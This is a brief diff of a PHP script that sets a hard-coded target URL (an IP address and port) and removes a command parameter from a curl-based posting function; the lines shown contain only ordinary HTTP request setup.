@@ -1,7 +1,7 @@
 <?php
 $TargetURL = "http://123.56.133.116:29999";
 
-function PostMsg($cmd, $post_data) {
+function PostMsg($post_data) {
     $curl = curl_init();
     curl_setopt($curl, CURLOPT_URL, $GLOBALS['TargetURL']);
     curl_setopt($curl, CURLOPT_HEADER, 0);
